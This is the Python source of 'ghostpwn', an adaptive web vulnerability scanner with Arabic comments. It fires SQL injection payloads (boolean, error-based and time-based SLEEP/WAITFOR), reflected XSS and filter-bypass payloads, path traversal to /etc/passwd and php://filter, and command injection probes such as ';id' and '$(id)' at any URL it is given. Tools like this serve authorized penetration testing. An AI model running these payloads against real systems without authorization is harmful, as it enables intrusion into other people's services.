#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostpwn - Adaptive Scanner
فحص تكيّفي ذكي - يعدّل استراتيجيته بناءً على الـ responses

الذكاء:
1. يبدأ بـ payloads بسيطة، ويزيد التعقيد لو فشل
2. يكشف patterns في الـ responses
3. يختار الـ payloads المناسبة لنوع الـ response
4. يتجنب الـ false positives
5. يتعلم من كل طلب
"""
import sys
import os
import re
import time
import random
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from modules.http_client import HttpClient
from modules.smart_waf import SmartWAFDetector, SmartRequestWrapper
from modules.arabic_display import SmartLogger, Colors, fix_display
from modules.vuln_notifier import SmartNotifier


class ResponseAnalyzer:
    """تحليل الـ response لاكتشاف patterns"""

    def __init__(self):
        self.baseline_responses = {}

    def analyze(self, response: Dict, baseline_key: str = None) -> Dict:
        """تحليل response"""
        analysis = {
            "status": response.get("status", 0),
            "body_length": len(response.get("body", "")),
            "has_error": False,
            "error_type": None,
            "has_reflection": False,
            "technologies": [],
            "interesting_headers": {},
            "timing": response.get("elapsed", 0),
        }

        body = response.get("body", "")
        headers = response.get("headers", {})

        # فحص errors شائعة
        error_patterns = {
            "sql_error": r"(SQL syntax|mysql_|mysqli_|SQLSTATE|Oracle error|ORA-|Microsoft SQL Server|sqlite3)",
            "php_error": r"(PHP (Warning|Notice|Fatal error)|Parse error|Undefined)",
            "asp_error": r"(Server Error in|Runtime Error|System\.Exception)",
            "java_error": r"(java\.lang\.|NullPointerException|SQLException| ServletException)",
            "python_error": r"(Traceback|Python|Django|Flask)",
            "ruby_error": r"(Ruby|Rails|ActionController)",
            "node_error": r"(node|Express|TypeError|undefined is not)",
        }

        for error_type, pattern in error_patterns.items():
            if re.search(pattern, body, re.IGNORECASE):
                analysis["has_error"] = True
                analysis["error_type"] = error_type
                break

        # فحص technologies
        tech_patterns = {
            "WordPress": r"(wp-content|wp-includes|wp-json)",
            "Drupal": r"(drupal\.js|sites/default)",
            "Joomla": r"(/components/com_)",
            "PHP": r"(PHPSESSID|X-Powered-By: PHP)",
            "ASP.NET": r"(__VIEWSTATE|ASPXAUTH)",
            "Java": r"(JSESSIONID|X-Powered-By: JSP)",
            "Node.js": r"(X-Powered-By: Express|Node)",
            "Python": r"(X-Powered-By: Werkzeug|Python)",
        }

        for tech, pattern in tech_patterns.items():
            if re.search(pattern, body, re.IGNORECASE) or \
               re.search(pattern, " ".join(f"{k}:{v}" for k, v in headers.items()), re.IGNORECASE):
                analysis["technologies"].append(tech)

        # فحص interesting headers
        for header in ["server", "x-powered-by", "x-aspnet-version", "x-generator"]:
            if header in {k.lower(): v for k, v in headers.items()}:
                analysis["interesting_headers"][header] = headers.get(header, "")

        # فحص reflection (لـ XSS)
        if baseline_key and baseline_key in body:
            analysis["has_reflection"] = True

        return analysis

    def compare_responses(self, resp1: Dict, resp2: Dict) -> Dict:
        """مقارنة response للكشف عن الفروق"""
        analysis1 = self.analyze(resp1)
        analysis2 = self.analyze(resp2)

        differences = {
            "status_differs": resp1.get("status") != resp2.get("status"),
            "length_differs": abs(analysis1["body_length"] - analysis2["body_length"]) > 100,
            "length_diff": analysis2["body_length"] - analysis1["body_length"],
            "error_introduced": (not analysis1["has_error"]) and analysis2["has_error"],
            "error_removed": analysis1["has_error"] and (not analysis2["has_error"]),
            "timing_diff": analysis2["timing"] - analysis1["timing"],
        }

        return differences


class AdaptiveScanner:
    """فحص تكيّفي ذكي"""

    def __init__(self, http_client: HttpClient, waf_detector: SmartWAFDetector = None,
                 notifier: SmartNotifier = None, audit_logger=None):
        self.client = http_client
        self.waf = waf_detector or SmartWAFDetector(http_client, audit_logger)
        self.notifier = notifier or SmartNotifier(audit_logger)
        self.audit = audit_logger
        self.logger = SmartLogger()
        self.analyzer = ResponseAnalyzer()

        # تعلم من الـ responses
        self.learned_patterns = {
            "error_messages": set(),
            "reflection_points": [],
            "interesting_params": [],
            "tech_stack": set(),
        }

        # إحصائيات
        self.stats = {
            "requests_made": 0,
            "vulns_found": 0,
            "false_positives": 0,
            "waf_blocks": 0,
            "timeouts": 0,
        }

    def _log(self, msg, level="info"):
        getattr(self.logger, level, self.logger.info)(msg)
        if self.audit:
            self.audit.log_event(msg, level)

    def smart_request(self, url: str, method: str = "GET",
                      data=None, headers=None) -> Optional[Dict]:
        """طلب ذكي مع WAF detection"""
        # فحص لو الـ WAF قال ننهي
        if self.waf.should_terminate:
            self._log("الفحص منتهي بسبب WAF", "error")
            return None

        resp = self.waf.safe_request(url, method, data, headers)
        self.stats["requests_made"] += 1

        if resp is None:
            self.stats["waf_blocks"] += 1
            return None

        # تعلم من الـ response
        self._learn_from_response(resp)

        return resp

    def _learn_from_response(self, response: Dict):
        """تعلم من الـ response"""
        if not response or "body" not in response:
            return

        body = response["body"]

        # تعلم error messages
        error_patterns = [
            r"(error|exception|warning|fatal|notice)[^<]{10,100}",
            r"(SQL syntax[^<]{10,100})",
            r"(warning[^<]{10,100})",
        ]

        for pattern in error_patterns:
            matches = re.finditer(pattern, body, re.IGNORECASE)
            for match in matches:
                error_msg = match.group(0).strip()[:100]
                if error_msg not in self.learned_patterns["error_messages"]:
                    self.learned_patterns["error_messages"].add(error_msg)
                    self._log(f"تعلمت pattern جديد: {error_msg[:50]}", "info")

        # تعلم tech stack
        analysis = self.analyzer.analyze(response)
        for tech in analysis["technologies"]:
            if tech not in self.learned_patterns["tech_stack"]:
                self.learned_patterns["tech_stack"].add(tech)
                self._log(f"تكنولوجيا مكتشفة: {tech}", "success")

    # ============================ Adaptive SQLi Detection ============================
    def detect_sqli_adaptive(self, url: str) -> List[Dict]:
        """كشف SQLi بشكل تكيّفي"""
        self._log("بدء فحص SQLi التكيّفي...", "info")

        parsed = urlparse(url)
        if not parsed.query:
            return []

        params = parse_qs(parsed.query)
        vulns_found = []

        for param_name in list(params.keys())[:3]:  # أول 3 params
            self._log(f"فحص parameter: {param_name}", "info")

            # المستوى 1: payloads بسيطة
            level1_payloads = ["'", "\"", "' OR '1'='1", "1 OR 1=1"]

            for payload in level1_payloads:
                if self.waf.should_terminate:
                    return vulns_found

                test_url = self._build_test_url(url, param_name, payload)
                resp = self.smart_request(test_url)

                if not resp:
                    continue

                # تحليل الـ response
                analysis = self.analyzer.analyze(resp)

                # فحص error-based
                if analysis["has_error"] and analysis["error_type"] == "sql_error":
                    vuln = {
                        "type": "sql_injection_error",
                        "severity": "critical",
                        "url": test_url,
                        "param": param_name,
                        "payload": payload,
                        "evidence": f"SQL error disclosed",
                    }
                    self.notifier.notify_vuln(vuln, confidence=0.95)
                    vulns_found.append(vuln)
                    self.stats["vulns_found"] += 1
                    return vulns_found  # وجدنا ثغرة، نوقف

                # فحص boolean-based
                if payload in ["' OR '1'='1", "1 OR 1=1"]:
                    # مقارنة مع payload false
                    false_payload = payload.replace("'1'='1", "'1'='2").replace("1=1", "1=2")
                    false_url = self._build_test_url(url, param_name, false_payload)
                    false_resp = self.smart_request(false_url)

                    if false_resp:
                        differences = self.analyzer.compare_responses(resp, false_resp)
                        # لو true response مختلف عن false response
                        if (differences["length_differs"] and
                            abs(differences["length_diff"]) > 200):
                            vuln = {
                                "type": "sql_injection_boolean",
                                "severity": "critical",
                                "url": test_url,
                                "param": param_name,
                                "payload": payload,
                                "evidence": f"Boolean: TRUE ({analysis['body_length']}) vs FALSE ({len(false_resp['body'])})",
                            }
                            self.notifier.notify_vuln(vuln, confidence=0.85)
                            vulns_found.append(vuln)
                            self.stats["vulns_found"] += 1
                            return vulns_found

            # المستوى 2: time-based (لو Level 1 فشل)
            self._log(f"Time-based detection for {param_name}...", "info")
            time_payloads = [
                "' AND SLEEP(5) -- -",
                "1 AND SLEEP(5)",
                "'; WAITFOR DELAY '0:0:5'--",
                "' AND BENCHMARK(5000000,MD5('test'))--",
            ]

            for payload in time_payloads:
                if self.waf.should_terminate:
                    return vulns_found

                test_url = self._build_test_url(url, param_name, payload)
                start_time = time.time()
                resp = self.smart_request(test_url)
                elapsed = time.time() - start_time

                if elapsed >= 4.5:  # لو استغرق أكتر من 4.5 ثانية
                    # نقارن بـ payload عادي
                    normal_url = self._build_test_url(url, param_name, "1")
                    normal_start = time.time()
                    normal_resp = self.smart_request(normal_url)
                    normal_elapsed = time.time() - normal_start

                    if elapsed > normal_elapsed + 4:  # الفرق أكبر من 4 ثواني
                        vuln = {
                            "type": "sql_injection_time",
                            "severity": "critical",
                            "url": test_url,
                            "param": param_name,
                            "payload": payload,
                            "evidence": f"Time: {elapsed:.1f}s vs normal {normal_elapsed:.1f}s",
                        }
                        self.notifier.notify_vuln(vuln, confidence=0.90)
                        vulns_found.append(vuln)
                        self.stats["vulns_found"] += 1
                        return vulns_found

        return vulns_found

    # ============================ Adaptive XSS Detection ============================
    def detect_xss_adaptive(self, url: str) -> List[Dict]:
        """كشف XSS بشكل تكيّفي"""
        self._log("بدء فحص XSS التكيّفي...", "info")

        parsed = urlparse(url)
        params = parse_qs(parsed.query) if parsed.query else {"q": [""]}

        vulns_found = []
        marker = f"ghost{random.randint(10000,99999)}"

        # Level 1: payloads بسيطة
        level1_payloads = [
            f"<script>alert({marker})</script>",
            f"<img src=x onerror=alert({marker})>",
            f"<svg onload=alert({marker})>",
        ]

        for param_name in list(params.keys())[:3]:
            for payload in level1_payloads:
                if self.waf.should_terminate:
                    return vulns_found

                test_url = self._build_test_url(url, param_name, payload)
                resp = self.smart_request(test_url)

                if not resp:
                    continue

                # فحص reflection
                if payload in resp["body"]:
                    # الـ payload اتنقل كما هو - ثغرة مؤكدة
                    vuln = {
                        "type": "xss_reflected",
                        "severity": "high",
                        "url": test_url,
                        "param": param_name,
                        "payload": payload,
                        "evidence": "Payload reflected without encoding",
                    }
                    self.notifier.notify_vuln(vuln, confidence=0.95)
                    vulns_found.append(vuln)
                    self.stats["vulns_found"] += 1
                    return vulns_found

                # فحص reflection جزئي
                if marker in resp["body"]:
                    # الـ marker اتنقل لكن الـ payload اتعدّل
                    # نحتاج payloads أعقد
                    self._log(f"Partial reflection - trying advanced payloads", "info")

                    # Level 2: payloads مع bypass
                    level2_payloads = [
                        f"><script>alert({marker})</script>",
                        f"'><script>alert({marker})</script>",
                        f"\"><script>alert({marker})</script>",
                        f"<scr<script>ipt>alert({marker})</script>",
                    ]

                    for adv_payload in level2_payloads:
                        adv_url = self._build_test_url(url, param_name, adv_payload)
                        adv_resp = self.smart_request(adv_url)

                        if adv_resp and adv_payload in adv_resp["body"]:
                            vuln = {
                                "type": "xss_reflected",
                                "severity": "high",
                                "url": adv_url,
                                "param": param_name,
                                "payload": adv_payload,
                                "evidence": "Advanced payload reflected",
                            }
                            self.notifier.notify_vuln(vuln, confidence=0.90)
                            vulns_found.append(vuln)
                            self.stats["vulns_found"] += 1
                            return vulns_found

        return vulns_found

    # ============================ Adaptive LFI Detection ============================
    def detect_lfi_adaptive(self, url: str) -> List[Dict]:
        """كشف LFI بشكل تكيّفي"""
        self._log("بدء فحص LFI التكيّفي...", "info")

        parsed = urlparse(url)
        if not parsed.query:
            return []

        params = parse_qs(parsed.query)
        vulns_found = []

        # ملفات للاختبار - نبدأ بالأساسية
        test_files = [
            ("../../../../etc/passwd", "root:", ":/bin/"),
            ("../../../etc/passwd", "root:", ":/bin/"),
            ("/etc/passwd", "root:", ":/bin/"),
        ]

        for param_name in list(params.keys())[:3]:
            for payload, indicator1, indicator2 in test_files:
                if self.waf.should_terminate:
                    return vulns_found

                test_url = self._build_test_url(url, param_name, payload)
                resp = self.smart_request(test_url)

                if not resp:
                    continue

                # فحص المؤشرات
                if indicator1 in resp["body"] and indicator2 in resp["body"]:
                    vuln = {
                        "type": "lfi",
                        "severity": "critical",
                        "url": test_url,
                        "param": param_name,
                        "payload": payload,
                        "evidence": f"Read /etc/passwd: found '{indicator1}'",
                    }
                    self.notifier.notify_vuln(vuln, confidence=0.95)
                    vulns_found.append(vuln)
                    self.stats["vulns_found"] += 1
                    return vulns_found

            # Level 2: php://filter
            self._log(f"Trying php://filter for {param_name}...", "info")
            filter_payload = "php://filter/convert.base64-encode/resource=index.php"
            test_url = self._build_test_url(url, param_name, filter_payload)
            resp = self.smart_request(test_url)

            if resp and resp["status"] == 200:
                # فحص base64 طويل
                import base64
                b64_match = re.search(r'([A-Za-z0-9+/]{60,}={0,2})', resp["body"])
                if b64_match:
                    try:
                        decoded = base64.b64decode(b64_match.group(1)).decode("utf-8", errors="ignore")
                        if "<?php" in decoded or "<?" in decoded:
                            vuln = {
                                "type": "lfi_php_filter",
                                "severity": "critical",
                                "url": test_url,
                                "param": param_name,
                                "payload": filter_payload,
                                "evidence": "PHP source extracted via php://filter",
                            }
                            self.notifier.notify_vuln(vuln, confidence=0.95)
                            vulns_found.append(vuln)
                            self.stats["vulns_found"] += 1
                            return vulns_found
                    except Exception:
                        pass

        return vulns_found

    # ============================ Adaptive Command Injection ============================
    def detect_cmd_injection_adaptive(self, url: str) -> List[Dict]:
        """كشف Command Injection بشكل تكيّفي"""
        self._log("بدء فحص Command Injection التكيّفي...", "info")

        parsed = urlparse(url)
        if not parsed.query:
            return []

        params = parse_qs(parsed.query)
        vulns_found = []

        # Level 1: payloads أساسية
        level1_payloads = [
            (";id", r"uid=\d+\([\w-]+\).*gid=\d+"),
            ("|id", r"uid=\d+\([\w-]+\).*gid=\d+"),
            ("`id`", r"uid=\d+\([\w-]+\).*gid=\d+"),
            ("$(id)", r"uid=\d+\([\w-]+\).*gid=\d+"),
        ]

        for param_name in list(params.keys())[:3]:
            for payload, pattern in level1_payloads:
                if self.waf.should_terminate:
                    return vulns_found

                test_url = self._build_test_url(url, param_name, payload)
                resp = self.smart_request(test_url)

                if not resp:
                    continue

                # فحص الـ pattern في الـ response
                match = re.search(pattern, resp["body"])
                if match:
                    vuln = {
                        "type": "command_injection",
                        "severity": "critical",
                        "url": test_url,
                        "param": param_name,
                        "payload": payload,
                        "evidence": f"Command output: {match.group(0)}",
                    }
                    self.notifier.notify_vuln(vuln, confidence=0.95)
                    vulns_found.append(vuln)
                    self.stats["vulns_found"] += 1
                    return vulns_found

            # Level 2: payloads مع bypass (لو Level 1 فشل)
            if not vulns_found:
                self._log(f"Trying bypass payloads for {param_name}...", "info")
                level2_payloads = [
                    (";id", r"uid="),  # pattern أبسط
                    ("|id", r"uid="),
                    ("&&id", r"uid="),
                    ("%3Bid", r"uid="),  # URL encoded
                ]

                for payload, pattern in level2_payloads:
                    test_url = self._build_test_url(url, param_name, payload)
                    resp = self.smart_request(test_url)

                    if resp and re.search(pattern, resp["body"]):
                        vuln = {
                            "type": "command_injection",
                            "severity": "critical",
                            "url": test_url,
                            "param": param_name,
                            "payload": payload,
                            "evidence": f"RCE confirmed (bypass)",
                        }
                        self.notifier.notify_vuln(vuln, confidence=0.85)
                        vulns_found.append(vuln)
                        self.stats["vulns_found"] += 1
                        return vulns_found

        return vulns_found

    # ============================ Helper ============================
    def _build_test_url(self, url: str, param: str, payload: str) -> str:
        """بناء URL مع payload"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                          parsed.params, new_query, parsed.fragment))

    # ============================ Run All Adaptive Scans ============================
    def run_adaptive_scan(self, url: str) -> List[Dict]:
        """تشغيل كل الفحوصات التكيّفية"""
        all_vulns = []

        # فحص WAF الأول
        self._log("فحص WAF...", "phase")
        waf_result = self.waf.detect_waf(url)

        if waf_result["detected"]:
            # إشعار بـ WAF
            self.notifier.notify_vuln({
                "type": "waf_detected",
                "severity": "info",
                "url": url,
                "evidence": f"WAF: {waf_result['name']}",
            }, confidence=0.95)

        # فحص الثغرات بالترتيب (من الأخطر للأقل)
        scans = [
            ("SQLi", self.detect_sqli_adaptive),
            ("XSS", self.detect_xss_adaptive),
            ("LFI", self.detect_lfi_adaptive),
            ("Command Injection", self.detect_cmd_injection_adaptive),
        ]

        for scan_name, scan_func in scans:
            if self.waf.should_terminate:
                self._log(f"تخطي {scan_name} بسبب حظر WAF", "warn")
                continue

            self._log(f"فحص {scan_name}...", "phase")
            vulns = scan_func(url)
            all_vulns.extend(vulns)

        return all_vulns

    def get_stats(self) -> Dict:
        """إحصائيات الفحص"""
        return {
            **self.stats,
            "waf_status": self.waf.get_status(),
            "learned_tech": list(self.learned_patterns["tech_stack"]),
            "learned_errors": list(self.learned_patterns["error_messages"])[:5],
        }


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="ghostpwn - Adaptive Scanner")
    parser.add_argument("--url", required=True)
    args = parser.parse_args()

    client = HttpClient(timeout=15)
    waf = SmartWAFDetector(client)
    notifier = SmartNotifier()

    scanner = AdaptiveScanner(client, waf, notifier)
    vulns = scanner.run_adaptive_scan(args.url)

    notifier.print_summary()
    print(f"\nStats: {scanner.get_stats()}")
